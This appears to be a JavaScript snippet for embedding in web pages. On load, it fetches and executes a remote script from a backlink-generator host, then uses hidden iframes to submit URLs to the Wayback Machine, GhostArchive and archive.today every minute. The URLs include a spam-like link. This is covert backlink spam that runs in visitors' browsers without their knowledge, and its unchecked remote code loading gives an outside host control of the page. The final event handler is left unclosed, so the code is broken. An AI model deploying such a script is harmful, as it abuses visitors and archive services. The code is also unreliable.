<script>
/* Injects a stealthIFrameContainer into the current page (no need for a manual <div>)
   Supports random submissions to web.archive.org, ghostarchive.org, and archive.today.
*/

const fetchData = [
    "http://folllike.com/?19265371"
];
const fetchURLs = [
	//"https://backlink-generator-tool.github.io/url-dump-json/url/custom-urls/backlink-generator.json"
	"https://backlink-generator-tool.github.io/url-dump-json/script/fetch/js/pinterest-pins.js"
];

const IFRAME_COUNT = 4;
const SUBMIT_INTERVAL = 60000; // 60s

function isValidURL(url) {
  const pattern = /^https?:\/\/[^\s]+$/i;
  return pattern.test(url);
}
function shuffle(array){ for(let i=array.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[array[i],array[j]]=[array[j],array[i]];} }
function normalizeURL(url){ if(typeof url!=='string') return ""; return url.replace(/([^:]\/)\/+/g,"$1"); }
function randomURL(array){ return array[Math.floor(Math.random()*array.length)]; }

/* ============================================================
     ðŸ”¥ UPDATED FUNCTION â€” JS + JSON Support
   ============================================================ */
async function updateDefaultURLs() {
  // Helper: import JS text as module from blob URL
  async function importModuleFromText(jsText) {
    const blob = new Blob([jsText], { type: "application/javascript" });
    const moduleUrl = URL.createObjectURL(blob);
    try {
      return await import(moduleUrl);
    } finally {
      URL.revokeObjectURL(moduleUrl);
    }
  }

  function extractFromJSON(data) {
    if (Array.isArray(data)) return data.slice();
    for (const key of ["urls","items","data","list"]) {
      if (Array.isArray(data?.[key])) return data[key].slice();
    }
    return [];
  }

  async function extractFromModule(mod) {
    if (!mod) return [];
    try {
      if (Array.isArray(mod.default)) return mod.default.slice();
      for (const key of ["urls","items","data","list","pins","pinIds"]) {
        if (Array.isArray(mod[key])) return mod[key].slice();
      }
      for (const fn of ["build","load","get"]) {
        if (typeof mod[fn] === "function") {
          const out = await mod[fn]();
          if (Array.isArray(out)) return out.slice();
        }
      }
    } catch (e) {
      console.error("âŒ extractFromModule threw:", e);
    }
    return [];
  }

  function loadViaScriptTag(url, timeout = 8000) {
    const GLOBAL_KEYS = [
      "REMOTE_URLS","REMOTE_DATA","REMOTE_ARRAY",
      "FETCH_JS_DATA","FETCH_DATA",
      "urls","items","pins","PIN_IDS"
    ];
    return new Promise((resolve) => {
      const script = document.createElement("script");
      let done = false;
      const timer = setTimeout(() => {
        if (done) return;
        done = true;
        script.remove();
        console.warn("âš  Script tag load timed out for", url);
        resolve([]);
      }, timeout);

      script.async = true;
      script.src = url;

      script.onload = () => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        let found = [];
        for (const key of GLOBAL_KEYS) {
          if (Array.isArray(window[key]) && window[key].length) {
            found = window[key].slice();
            try { delete window[key]; } catch(e) {}
            console.log("â„¹ Found global array on window.", key, "length=", found.length);
            break;
          }
        }
        script.remove();
        resolve(found);
      };

      script.onerror = (ev) => {
        if (done) return;
        done = true;
        clearTimeout(timer);
        script.remove();
        console.error("âŒ Script tag failed to load:", url, ev && (ev.error || ev.message) || ev);
        resolve([]);
      };

      // attach to head
      document.head.appendChild(script);
    });
  }

  shuffle(fetchURLs);

  for (const u of fetchURLs) {
    console.log("ðŸ”Ž Trying to fetch URL list from:", u);
    const lower = u.split('?')[0].toLowerCase();

    // JSON path
    if (lower.endsWith(".json")) {
      try {
        const r = await fetch(u);
        console.log("â†’ fetch status", r.status, r.statusText, "for", u);
        console.log("â†’ content-type:", r.headers.get("content-type"));
        if (!r.ok) {
          console.warn("âš  JSON fetch returned not ok for", u);
        } else {
          const payload = await r.json().catch(e => { console.error("âš  JSON parse error:", e); return null; });
          if (payload) {
            const arr = extractFromJSON(payload);
            console.log("â†’ JSON array length:", arr.length);
            if (arr.length) {
              fetchData.length = 0;
              fetchData.push(...arr);
              console.log("âœ… Loaded", arr.length, "URLs from JSON:", u);
              return;
            }
          }
        }
      } catch (e) {
        console.warn("âš  Error fetching/parsing JSON", u, e);
      }
      continue;
    }

    // JS / MJS path
    if (lower.endsWith(".js") || lower.endsWith(".mjs")) {
      // 1) Try fetch + import module
      try {
        const r = await fetch(u);
        console.log("â†’ fetch status", r.status, r.statusText, "for", u);
        console.log("â†’ content-type:", r.headers.get("content-type"));
        if (!r.ok) {
          console.warn("âš  JS fetch returned not ok for", u);
        } else {
          const text = await r.text();
          console.log("â†’ fetched JS length:", text.length, "chars. Preview:\n", text.slice(0,400).replace(/\n/g,'â†µ'));
          // Attempt to import module from text
          try {
            const mod = await importModuleFromText(text);
            console.log("â†’ import(module) success for", u, "module keys:", Object.keys(mod));
            const arr = await extractFromModule(mod);
            console.log("â†’ extracted array from module length:", arr.length);
            if (arr.length) {
              fetchData.length = 0;
              fetchData.push(...arr);
              console.log("âœ… Loaded", arr.length, "URLs from JS module:", u);
              return;
            } else {
              console.warn("âš  Module imported but no array found in module exports for", u);
            }
          } catch (impErr) {
            console.error("âš  import(module) failed for", u, impErr && (impErr.stack || impErr.message || impErr));
          }
        }
      } catch (fetchErr) {
        console.error("âš  Fetch JS text failed for", u, fetchErr && (fetchErr.stack || fetchErr.message || fetchErr));
      }

      // 2) Fallback: script tag injection
      try {
        console.log("â†’ Attempting script-tag fallback for", u);
        const arr = await loadViaScriptTag(u);
        console.log("â†’ script-tag returned array length:", arr.length);
        if (arr.length) {
          fetchData.length = 0;
          fetchData.push(...arr);
          console.log("âœ… Loaded", arr.length, "URLs from JS script:", u);
          return;
        } else {
          console.warn("âš  Script fallback returned no usable array for", u);
        }
      } catch (e) {
        console.error("âš  Script fallback error for", u, e);
      }

      continue;
    }

    // Unknown extension: try JSON then JS fallback (same diagnostics)
    try {
      const r = await fetch(u);
      console.log("â†’ fallback fetch status", r.status, r.statusText, "for", u);
      console.log("â†’ content-type:", r.headers.get("content-type"));
      if (r.ok) {
        const maybeJson = await r.json().catch(()=>null);
        if (maybeJson) {
          const arr = extractFromJSON(maybeJson);
          console.log("â†’ fallback JSON array length:", arr.length);
          if (arr.length) {
            fetchData.length = 0;
            fetchData.push(...arr);
            console.log("âœ… Loaded", arr.length, "URLs from fallback JSON:", u);
            return;
          }
        }
      }
    } catch (e) {
      console.warn("âš  fallback JSON attempt failed for", u, e);
    }

    // fallback script tag
    try {
      console.log("â†’ fallback script-tag attempt for", u);
      const arr2 = await loadViaScriptTag(u);
      console.log("â†’ fallback script returned length:", arr2.length);
      if (arr2.length) {
        fetchData.length = 0;
        fetchData.push(...arr2);
        console.log("âœ… Loaded", arr2.length, "URLs from fallback JS:", u);
        return;
      }
    } catch (e) {
      console.warn("âš  fallback script-tag failed for", u, e);
    }

    console.warn("âš  Failed to load from", u);
  }

  console.warn("âš  Using fallback URLs:", fetchData.length);
}


/* ============================================================
   (rest of your original code remains unchanged)
   ============================================================ */

function generateTargetURL() {
  if (!fetchData.length) return "";
  const combined = randomURL(fetchData);
  return normalizeURL(combined);
}

const archiveURLs = [
        "https://archive.today/submit/",
        "https://archive.li/submit/",
        "https://archive.vn/submit/",
        "https://archive.fo/submit/",
        "https://archive.md/submit/",
        "https://archive.ph/submit/"
];

/* Archive site definitions */
const ARCHIVE_SITES = [
      [
        {
          name: "Wayback",
          action: "https://web.archive.org/save",
          method: "POST",
          inputName: "url",
          extraParams: {}
        }
    ],
    [
        {
          name: "GhostArchive",
          //action: "https://ghostarchive.org/archive2",
          action: "https://ghostarchive.org/archive",
          method: "POST",
          inputName: "archive",
          extraParams: {}
        }
    ],
    [
        {
          name: "archive.today",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.li",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.vn",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.fo",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.md",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        },
        {
          name: "archive.ph",
          action: "https://archive.today/submit/",
          method: "GET",
          inputName: "url",
          extraParams: { anyway: "1" }
        }
     ]
];

function chooseRandomArchive() {
     const randomArray = ARCHIVE_SITES[Math.floor(Math.random() * ARCHIVE_SITES.length)];
     return randomArray[Math.floor(Math.random() * randomArray.length)];
}

function buildAndSubmitArchiveForm(site, targetUrl, targetFrameName) {
  if (!site || !targetUrl) return;
  try {
    const form = document.createElement("form");
    form.style.display = "none";
    form.method = site.method || "POST";
    form.action = site.action;
    if (targetFrameName) form.target = targetFrameName;
    else form.target = "_self";

    const urlInput = document.createElement("input");
    urlInput.type = (site.method === "GET") ? "text" : "hidden";
    urlInput.name = site.inputName || "url";
    urlInput.value = targetUrl;
    form.appendChild(urlInput);

    if (site.extraParams) {
      for (const [k, v] of Object.entries(site.extraParams)) {
        const inp = document.createElement("input");
        inp.type = "hidden";
        inp.name = k;
        inp.value = v;
        form.appendChild(inp);
      }
    }

    document.body.appendChild(form);
    console.log(`ðŸ“¨ Submitting to ${site.name} (${site.action}) via ${site.method} target=${form.target} url=${targetUrl}`);
    form.submit();
    setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
  } catch (err) {
    console.error("âŒ buildAndSubmitArchiveForm error:", err);
  }
}

function submitToArchiveInFrame(iframe) {
  try {
    const targetUrl = generateTargetURL();
    if (!targetUrl || !isValidURL(targetUrl)) {
      console.warn("âš  Skipping invalid target:", targetUrl);
      return;
    }
    const site = chooseRandomArchive();
    buildAndSubmitArchiveForm(site, targetUrl, iframe.name);
  } catch (err) {
    console.error("âŒ submitToArchiveInFrame error:", err);
  }
}

function createIframe(i, container) {
  try {
    const iframe = document.createElement("iframe");
    const fname = "hiddenFrame" + i;
    iframe.setAttribute("name", fname);
    iframe.setAttribute("id", fname);
    iframe.classList.add("hidden-iframe");
    iframe.style.width = "100%";
    iframe.style.height = "200px";
    iframe.style.border = "0";
    iframe.src = "about:blank";

    container.appendChild(iframe);

    setTimeout(() => submitToArchiveInFrame(iframe), 250);

    setInterval(() => {
      console.log("â± Interval firing for iframe:", fname);
      submitToArchiveInFrame(iframe);
    }, SUBMIT_INTERVAL);
  } catch (err) {
    console.error("âŒ createIframe error:", err);
  }
}

function submitToArchiveRedirect(url) {
  if (!url || !isValidURL(url)) {
    console.warn("âš  Invalid or empty URL for redirect submission:", url);
    return;
  }
  const site = chooseRandomArchive();
  buildAndSubmitArchiveForm(site, url, "_self");
}

function inIframe() {
  try {
    return window.self !== window.top;
  } catch (e) {
    return true;
  }
}

function ensureContainer() {
  return document.body || document.documentElement;
}

document.addEventListener('DOMContentLoaded', async () => {
  try {
    await updateDefaultURLs();
  } catch (e) {
    console.warn("updateDefaultURLs() failed:", e && e.message);
  }

  const container = ensureContainer();

  if (inIframe()) {
    for (let i = 0; i < IFRAME_COUNT; i++) {
      createIframe(i, container);
    }
  } else {
    submitToArchiveRedirect(generateTargetURL());
  }

</script>
